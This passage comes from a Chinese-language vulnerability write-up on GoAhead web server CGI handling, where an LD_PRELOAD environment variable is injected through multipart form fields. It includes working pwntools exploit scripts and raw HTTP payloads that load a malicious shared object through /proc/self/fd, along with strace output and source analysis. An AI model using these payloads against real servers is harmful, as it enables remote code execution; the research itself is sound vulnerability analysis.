</span><span style="color:#a3be8c;">Content-Length: </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(expso)+</span><span style="color:#d08770;">500</span><span style="color:#c0c5ce;">}</span><span style="color:#96b5b4;">\r
</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">------WebKitFormBoundarylNDKbe0ngCGdEiPM</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;</span><span style="color:#96b5b4;">\r
</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">/proc/self/fd/7</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">------WebKitFormBoundarylNDKbe0ngCGdEiPM</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Disposition: form-data; name=&quot;data&quot;; filename=&quot;1.txt&quot;</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Type: text/plain</span><span style="color:#96b5b4;">\r
</span><span style="color:#96b5b4;">\r
</span><span style="color:#c0c5ce;">&#39;&#39;&#39;.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">_packet+=expso
</span><span style="color:#c0c5ce;">_packet+=</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">A</span><span style="color:#c0c5ce;">&quot;*</span><span style="color:#d08770;">2000  
</span><span style="color:#c0c5ce;">_packet+=</span><span style="color:#b48ead;">b</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\r\n</span><span style="color:#a3be8c;">------WebKitFormBoundarylNDKbe0ngCGdEiPM--</span><span style="color:#96b5b4;">\r\n</span><span style="color:#c0c5ce;">&quot;
</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(_packet)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">interactive</span><span style="color:#c0c5ce;">()
</span></pre>
<p>返回出现<code>Hacked</code>
同时，可以发现<code>/proc/self/fd</code>目录下出现了我们上传的临时文件的fd，且正好是7，成功文件包含</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">Hacked
</span><span style="color:#c0c5ce;">Content-Type: text/plain
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">Hacked
</span><span style="color:#c0c5ce;">total 0
</span><span style="color:#c0c5ce;">dr-x------ 2 root root  8 Oct  1 22:31 .
</span><span style="color:#c0c5ce;">dr-xr-xr-x 9 root root  0 Oct  1 22:31 ..
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 22:31 0 -&gt; /tmp/cgi-24.tmp
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 22:31 1 -&gt; /tmp/cgi-26.tmp
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 22:31 2 -&gt; /dev/pts/1
</span><span style="color:#c0c5ce;">l-wx------ 1 root root 64 Oct  1 22:31 3 -&gt; /home/ayoung/goahead/test/a
</span><span style="color:#c0c5ce;">lr-x------ 1 root root 64 Oct  1 22:31 4 -&gt; /proc/121437/fd
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 22:31 6 -&gt; /tmp/cgi-24.tmp
</span><span style="color:#c0c5ce;">l-wx------ 1 root root 64 Oct  1 22:31 7 -&gt; /home/ayoung/goahead/test/tmp/tmp-25.tmp
</span><span style="color:#c0c5ce;">lrwx------ 1 root root 64 Oct  1 22:31 8 -&gt; /tmp/cgi-26.tmp
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">Hacked
</span><span style="color:#c0c5ce;">total 24
</span><span style="color:#c0c5ce;">drwxrwxr-x  2 ayoung ayoung  4096 Oct  1 22:31 .
</span><span style="color:#c0c5ce;">drwxrwxr-x 16 ayoung ayoung  4096 Oct  1 22:18 ..
</span><span style="color:#c0c5ce;">-rw-rw-r--  1 ayoung ayoung     0 Sep 19 21:51 .keep
</span><span style="color:#c0c5ce;">-rw-------  1 root   root   14815 Oct  1 22:31 tmp-25.tmp
</span></pre>
<p>另一种方法，找找有没有其他写入临时文件的地方做包含
全局搜索<code>write\(.*fd</code>
除去前文利用的上传文件中的写入，还有一处写入位于<code>cgi.c/websProcessCgiData</code>函数中</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">bool </span><span style="color:#8fa1b3;">websProcessCgiData</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    ssize   nbytes;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    nbytes = </span><span style="color:#8fa1b3;">bufLen</span><span style="color:#c0c5ce;">(&amp;wp-&gt;input);
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">cgi: write </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> bytes to CGI program</span><span style="color:#c0c5ce;">&quot;, nbytes);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(wp-&gt;cgifd, wp-&gt;input.</span><span style="color:#bf616a;">servp</span><span style="color:#c0c5ce;">, (</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;">) nbytes) != nbytes) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">websError</span><span style="color:#c0c5ce;">(wp, HTTP_CODE_INTERNAL_SERVER_ERROR| WEBS_CLOSE, &quot;</span><span style="color:#a3be8c;">Cannot write to CGI gateway</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">trace</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">5</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">cgi: write </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> bytes to CGI program</span><span style="color:#c0c5ce;">&quot;, nbytes);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">websConsumeInput</span><span style="color:#c0c5ce;">(wp, nbytes);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span></pre>
<p>该函数紧接着在<code>websProcessUploadData</code>之后</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static bool </span><span style="color:#8fa1b3;">processContent</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;">    canProceed;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!wp-&gt;eof) {
</span><span style="color:#c0c5ce;">        ...
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ME_GOAHEAD_UPLOAD
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;flags &amp; WEBS_UPLOAD) {
</span><span style="color:#c0c5ce;">            canProceed = </span><span style="color:#8fa1b3;">websProcessUploadData</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!canProceed || wp-&gt;finalized) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> canProceed;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#b48ead;">#endif
</span><span style="color:#b48ead;">#if</span><span style="color:#c0c5ce;"> ME_GOAHEAD_CGI
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(wp-&gt;cgifd &gt;= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            canProceed = </span><span style="color:#8fa1b3;">websProcessCgiData</span><span style="color:#c0c5ce;">(wp);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!canProceed || wp-&gt;finalized) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> canProceed;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#b48ead;">#endif
</span><span style="color:#c0c5ce;">    </span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    ...
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> canProceed;
</span><span style="background-color:#bf616a;color:#2b303b;">}</span><span style="color:#c0c5ce;">
</span></pre>
<p>而<code>websProcessUploadData()</code>函数中，循环时读取当前行存为<code>line</code>，然后更新<code>wp-&gt;input.servp</code>，保证<code>wp-&gt;input.servp</code>每次指向最新一行，boundary结束符<code>--</code>时切换状态为<code>UPLOAD_CONTENT_END</code>退出while。返回前还会执行一个<code>bufCompact()</code></p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">bool </span><span style="color:#8fa1b3;">websProcessUploadData</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char    </span><span style="color:#c0c5ce;">*line, *nextTok;
</span><span style="color:#c0c5ce;">    ssize   nbytes;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">bool</span><span style="color:#c0c5ce;">    canProceed;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    line = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    canProceed = </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">while </span><span style="color:#c0c5ce;">(canProceed &amp;&amp; !wp-&gt;finalized &amp;&amp; wp-&gt;uploadState != UPLOAD_CONTENT_END) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if  </span><span style="color:#c0c5ce;">(wp-&gt;uploadState == UPLOAD_BOUNDARY || wp-&gt;uploadState == UPLOAD_CONTENT_HEADER) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">                Parse the next input line
</span><span style="color:#65737e;">             */
</span><span style="color:#c0c5ce;">            line = wp-&gt;input.</span><span style="color:#bf616a;">servp</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((nextTok = </span><span style="color:#96b5b4;">memchr</span><span style="color:#c0c5ce;">(line, &#39;</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&#39;, </span><span style="color:#8fa1b3;">bufLen</span><span style="color:#c0c5ce;">(&amp;wp-&gt;input))) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#65737e;">/* Incomplete line */
</span><span style="color:#c0c5ce;">                canProceed = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">            *nextTok++ = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">            nbytes = nextTok - line;
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(nbytes &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">websConsumeInput</span><span style="color:#c0c5ce;">(wp, nbytes);
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">strim</span><span style="color:#c0c5ce;">(line, &quot;</span><span style="color:#96b5b4;">\r</span><span style="color:#c0c5ce;">&quot;, WEBS_TRIM_END);
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">switch </span><span style="color:#c0c5ce;">(wp-&gt;uploadState) {
</span><span style="color:#c0c5ce;">        ...
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> UPLOAD_BOUNDARY:
</span><span style="color:#c0c5ce;">            </span><span style="color:#8fa1b3;">processContentBoundary</span><span style="color:#c0c5ce;">(wp, line);
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">		...
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">case</span><span style="color:#c0c5ce;"> UPLOAD_CONTENT_END:
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">bufCompact</span><span style="color:#c0c5ce;">(&amp;wp-&gt;input);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> canProceed;
</span><span style="color:#c0c5ce;">}
</span></pre>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">static void </span><span style="color:#8fa1b3;">processContentBoundary</span><span style="color:#c0c5ce;">(Webs *</span><span style="color:#bf616a;">wp</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">line</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">        Expecting a multipart boundary string
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strncmp</span><span style="color:#c0c5ce;">(wp-&gt;boundary, line, wp-&gt;boundaryLen) != </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {...}
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(line[wp-&gt;boundaryLen] &amp;&amp; </span><span style="color:#96b5b4;">strcmp</span><span style="color:#c0c5ce;">(&amp;line[wp-&gt;boundaryLen], &quot;</span><span style="color:#a3be8c;">--</span><span style="color:#c0c5ce;">&quot;) == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">        wp-&gt;uploadState = UPLOAD_CONTENT_END;
</span><span style="color:#c0c5ce;">    } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{...}
</span><span style="color:#c0c5ce;">}
</span></pre>
<p><code>bufCompact()</code>函数如果数据包还有内容，将<code>bp-&gt;servp</code>拷贝到<code>bp-&gt;buf</code>，再更新<code>bp-&gt;servp = bp-&gt;buf;</code>，所以不影响前文分析的<code>bp-&gt;servp</code>指向boundary结束符的下一行开头</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">PUBLIC </span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">bufCompact</span><span style="color:#c0c5ce;">(WebsBuf *</span><span style="color:#bf616a;">bp</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    ssize   len;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(bp-&gt;buf) {
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">((len = </span><span style="color:#8fa1b3;">bufLen</span><span style="color:#c0c5ce;">(bp)) &gt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(bp-&gt;servp &lt; bp-&gt;endp &amp;&amp; bp-&gt;servp &gt; bp-&gt;buf) {
</span><span style="color:#c0c5ce;">                </span><span style="color:#8fa1b3;">bufAddNull</span><span style="color:#c0c5ce;">(bp);
</span><span style="color:#c0c5ce;">                </span><span style="color:#96b5b4;">memmove</span><span style="color:#c0c5ce;">(bp-&gt;buf, bp-&gt;servp, len + </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                bp-&gt;endp -= bp-&gt;servp - bp-&gt;buf;
</span><span style="color:#c0c5ce;">                bp-&gt;servp = bp-&gt;buf;
</span><span style="color:#c0c5ce;">            }
</span><span style="color:#c0c5ce;">        } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">            bp-&gt;servp = bp-&gt;endp = bp-&gt;buf;
</span><span style="color:#c0c5ce;">            *bp-&gt;servp = &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;;
</span><span style="color:#c0c5ce;">        }
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">}
</span></pre>
<p>之后就会进入<code>websProcessCgiData()</code>将结束符后的内容写入临时文件中，发送下面报文并监控系统调用可以捕捉到写入</p>
<blockquote>
<p>这个报文就不需要最后再空一行，不过为了保险也可以都保持空出一行</p>
</blockquote>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">POST /cgi-bin/test HTTP/1.1
</span><span style="color:#c0c5ce;">Host: 192.168.130.133:8888
</span><span style="color:#c0c5ce;">Cache-Control: max-age=0
</span><span style="color:#c0c5ce;">Upgrade-Insecure-Requests: 1
</span><span style="color:#c0c5ce;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
</span><span style="color:#c0c5ce;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
</span><span style="color:#c0c5ce;">Accept-Encoding: gzip, deflate
</span><span style="color:#c0c5ce;">Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5
</span><span style="color:#c0c5ce;">Connection: close
</span><span style="color:#c0c5ce;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM
</span><span style="color:#c0c5ce;">Content-Length: 151
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">------WebKitFormBoundarylNDKbe0ngCGdEiPM
</span><span style="color:#c0c5ce;">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">222
</span><span style="color:#c0c5ce;">------WebKitFormBoundarylNDKbe0ngCGdEiPM--
</span><span style="color:#c0c5ce;">ayoung
</span></pre>
<p>删去一些对日志的写入，监控到写入系统调用</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~/goahead/test$ sudo strace -p `pidof goahead` -f -e trace=openat,unlink,write,dup2
</span><span style="color:#c0c5ce;">strace: Process 129786 attached
</span><span style="color:#c0c5ce;">...
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-73.tmp&quot;, O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
</span><span style="color:#c0c5ce;">...
</span><span style="color:#c0c5ce;">write(6, &quot;ayoung&quot;, 6)                   = 6
</span><span style="color:#c0c5ce;">...
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-73.tmp&quot;, O_RDWR|O_CREAT, 0666) = 6
</span><span style="color:#c0c5ce;">openat(AT_FDCWD, &quot;/tmp/cgi-74.tmp&quot;, O_RDWR|O_CREAT|O_TRUNC, 0666) = 7
</span><span style="color:#c0c5ce;">strace: Process 131117 attached
</span><span style="color:#c0c5ce;">[pid 131117] dup2(6, 0)                 = 0
</span><span style="color:#c0c5ce;">...
</span></pre>
<p>不过如果不修改content-length，该文件仍然会被删除</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">ayoung@ay:~/goahead/test$ cat /tmp/cgi-0.tmp 
</span><span style="color:#c0c5ce;">ayoung
</span></pre>
<p>注入的环境变量可以是<code>/proc/self/fd/0</code>也可以是<code>/proc/self/fd/6</code>，因为 execve 前调用了<code>dup2</code>，从上面系统调用监控结果能看出来 6 是对于父进程的 fd，0 是对于子进程的 fd</p>
<p>脚本如下</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">from </span><span style="color:#c0c5ce;">pwn </span><span style="color:#b48ead;">import</span><span style="color:#d08770;">*
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">r = </span><span style="color:#8fa1b3;">remote</span><span style="color:#c0c5ce;">(&#39;</span><span style="color:#a3be8c;">192.168.130.133</span><span style="color:#c0c5ce;">&#39;,</span><span style="color:#d08770;">8888</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">with </span><span style="color:#96b5b4;">open</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">exp.so</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">rb</span><span style="color:#c0c5ce;">&quot;) </span><span style="color:#b48ead;">as </span><span style="color:#c0c5ce;">f:
</span><span style="color:#c0c5ce;">    expso = f.</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">body = &#39;&#39;&#39;</span><span style="color:#a3be8c;">------WebKitFormBoundarylNDKbe0ngCGdEiPM</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Disposition: form-data; name=&quot;LD_PRELOAD&quot;;</span><span style="color:#96b5b4;">\r
</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">/proc/self/fd/0</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">------WebKitFormBoundarylNDKbe0ngCGdEiPM--</span><span style="color:#96b5b4;">\r
</span><span style="color:#c0c5ce;">&#39;&#39;&#39;.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">body += expso
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">_packet = </span><span style="color:#b48ead;">f</span><span style="color:#c0c5ce;">&#39;&#39;&#39;</span><span style="color:#a3be8c;">POST /cgi-bin/test HTTP/1.1</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Host: 192.168.130.133:8888</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Cache-Control: max-age=0</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Upgrade-Insecure-Requests: 1</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Accept-Encoding: gzip, deflate</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Accept-Language: en-CN,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,en-GB;q=0.6,en-US;q=0.5</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Connection: close</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Type: multipart/form-data; boundary=----WebKitFormBoundarylNDKbe0ngCGdEiPM</span><span style="color:#96b5b4;">\r
</span><span style="color:#a3be8c;">Content-Length: </span><span style="color:#c0c5ce;">{</span><span style="color:#96b5b4;">len</span><span style="color:#c0c5ce;">(body)}</span><span style="color:#96b5b4;">\r
</span><span style="color:#96b5b4;">\r
</span><span style="color:#c0c5ce;">&#39;&#39;&#39;.</span><span style="color:#8fa1b3;">encode</span><span style="color:#c0c5ce;">()
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">_packet+=body
</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">send</span><span style="color:#c0c5ce;">(_packet)
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">r.</span><span style="color:#8fa1b3;">interactive</span><span style="color:#c0c5ce;">()
</span></pre>
<h3 id="fen-xi">分析</h3><p>根因属于函数的误用，利用上结合了过滤不可信变量时存在遗漏
处理命令行参数时如下所示，首先使用了<code>strim</code>函数</p>
<pre style="background-color:#2b303b;">
<span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s-&gt;content.</span><span style="color:#bf616a;">valid </span><span style="color:#c0c5ce;">&amp;&amp; s-&gt;content.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">== string) {
</span><span style="color:#c0c5ce;">                vp = </span><span style="color:#8fa1b3;">strim</span><span style="color:#c0c5ce;">(s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, WEBS_TRIM_START);
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(vp, &quot;</span><span style="color:#a3be8c;">REMOTE_HOST</span><span style="color:#c0c5ce;">&quot;) || </span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(vp, &quot;</span><span style="color:#a3be8c;">HTTP_AUTHORIZATION</span><span style="color:#c0c5ce;">&quot;) ||
</span><span style="color:#c0c5ce;">                    </span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(vp, &quot;</span><span style="color:#a3be8c;">IFS</span><span style="color:#c0c5ce;">&quot;) || </span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(vp, &quot;</span><span style="color:#a3be8c;">CDPATH</span><span style="color:#c0c5ce;">&quot;) ||
</span><span style="color:#c0c5ce;">                    </span><span style="color:#8fa1b3;">smatch</span><span style="color:#c0c5ce;">(vp, &quot;</span><span style="color:#a3be8c;">PATH</span><span style="color:#c0c5ce;">&quot;) || </span><span style="color:#8fa1b3;">sstarts</span><span style="color:#c0c5ce;">(vp, &quot;</span><span style="color:#a3be8c;">LD_</span><span style="color:#c0c5ce;">&quot;)) {
</span><span style="color:#c0c5ce;">                    </span><span style="color:#b48ead;">continue</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">                }
</span><span style="color:#c0c5ce;">                </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(s-&gt;arg != </span><span style="color:#d08770;">0 </span><span style="color:#c0c5ce;">&amp;&amp; *ME_GOAHEAD_CGI_VAR_PREFIX != &#39;</span><span style="color:#96b5b4;">\0</span><span style="color:#c0c5ce;">&#39;) {
</span><span style="color:#c0c5ce;">                    envp[n++] = </span><span style="color:#8fa1b3;">sfmt</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s%s</span><span style="color:#a3be8c;">=</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, ME_GOAHEAD_CGI_VAR_PREFIX, s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">,
</span><span style="color:#c0c5ce;">                        s-&gt;content.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                } </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">                    envp[n++] = </span><span style="color:#8fa1b3;">sfmt</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;">=</span><span style="color:#d08770;">%s</span><span style="color:#c0c5ce;">&quot;, s-&gt;name.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">, s-&gt;content.</span><span style="color:#bf616a;">value</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">string</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">                }
